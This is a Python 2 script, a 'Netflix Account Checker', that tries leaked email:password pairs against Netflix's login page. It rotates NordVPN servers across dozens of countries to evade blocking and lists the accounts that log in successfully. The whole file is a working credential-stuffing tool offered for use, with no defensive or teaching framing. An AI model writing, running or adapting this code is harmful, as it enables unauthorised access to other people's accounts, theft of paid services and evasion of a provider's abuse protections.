#!/usr/bin/env python2
import mechanize
import urllib2, sys, getopt
import os
import time
from playsound import playsound
import aide
from random import randrange
###################################################### Configurations #######################################################################
RED, GREEN, END = '\033[91m', '\033[1;32m', '\033[0m'
spaces = " " * 76
os.popen("clear")
print(GREEN + "[+]-----------Netflix Account Checker v2.0---------------[+]".center(86))
print("--------------By Karbache Abdelkader Amine----------------".center(86) + END)
time.sleep(1)
active=0
innactive=0
opts, args = getopt.getopt(sys.argv[1:], "hw:", ["help", "wordlist"])
for o, a in opts:
	if o in ("-h", "--help"):
		aide.aide()
		exit()
	elif o in ("-w", "--wordlist"):
		fichier = a
	else:
		print "unknown option"
		aide.aide()
accPass=[]
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]

################################################### Initialising connection #############################################################
def vpn():
	rand = randrange (len(countries))
	a = os.popen("nordvpn connect " + countries[rand])
	print countries[rand]
countries=["Albania","Chile","Georgia","Israel","New_Zealand","Slovenia","Ukraine","Argentina","Costa_Rica","Germany","Italy","North_Macedonia","South_Africa","United_Kingdom","Australia","Croatia","Greece","Japan","Norway","South_Korea","United_States","Austria","Cyprus","Hong_Kong","Latvia","Poland","Spain","Vietnam","Belgium","czech_Republic","Hungary","Luxembourg","Portugal","Sweden","Bosnia_And_Herzegovina","Denmark","Iceland","Malaysia","Romania","Switzerland","Brazil","Estonia","India","Mexico","Serbia","Taiwan","Bulgaria","Finland","Indonesia","Moldova","Singapore","Thailand","France","Ireland","Netherlands","Slovakia","Turkey"]


def connecting(currentline, innactive, active, n):
	RED, GREEN, END = '\033[91m', '\033[1;32m', '\033[0m'
	br.select_form(nr=0)
	br.form['userLoginId'] = currentline[0]
	br.form['password'] = currentline[1]
	print str(n) + '- Login to.. mail: '+br.form['userLoginId']
	try:
		response = br.submit()
	except:
		vpn()
		try:
			br.open('https://www.netflix.com/Login?locale=es-CL')
		except urllib2.HTTPError as error:
			print "Failled %s" % error.code
		br.select_form(nr=0)
		br.form['userLoginId'] = currentline[0]
		br.form['password'] = currentline[1]
		response = br.submit()
	me = response.read()
	sign = 'login-content login-form hybrid-login-form hybrid-login-form-signup'
	if response.geturl()=='https://www.netflix.com/browse':
		s = playsound("notification.wav")
		print (GREEN + 'Mail ' + currentline[0] + ' is Active{}'.format(END))
		active += 1
		br.open('https://www.netflix.com/SignOut?lnkctr=mL')
		accPass.append(currentline[0]+':'+currentline[1])
		try:
			br.open('https://www.netflix.com/Login?locale=es-CL')
		except urllib2.HTTPError as error:
			print "Failled %s" % error.code
			vpn()

	elif me.find(sign) >= 1:
		print(RED+currentline[0]+" Incorrect email or password{}".format(END))
		innactive += 1	
		
	elif me.find(sign) < 0:
		print (RED+currentline[0]+" Abonnement ended{}".format(END))
		try:
			br.open('https://www.netflix.com/SignOut?lnkctr=mL')
		except urllib2.HTTPError as error:
			print "Failled %s" % error.code
			vpn()
		innactive += 1

i = 20	

########################################################## Principal program ###############################################################
n = 0

try:
	with open(fichier, "r") as filestream:
		for line in filestream:
			n += 1
			if i == 20:
				i=0
				vpn()
				try:
					br.open('https://www.netflix.com/Login?locale=es-CL')
				except urllib2.HTTPError as error:
					print "Failled %s" % error.code
					vpn()
					i = 10
					continue
			currentline = line.split(':')
			connecting(currentline, innactive, active, n)
			i += 1

	print 'We have tried all the txt..'

except KeyboardInterrupt:
	print "Thanks for using this application"
	a = os.popen("nordvpn disconnect")
	exit()


a = os.popen("nordvpn disconnect")
print "\nActivated mails are:"
for line in accPass:
    print GREEN + line + END
print '\nActivated mails: ' + str(active) 
print 'Innactivated mails: ' + str(innactive)






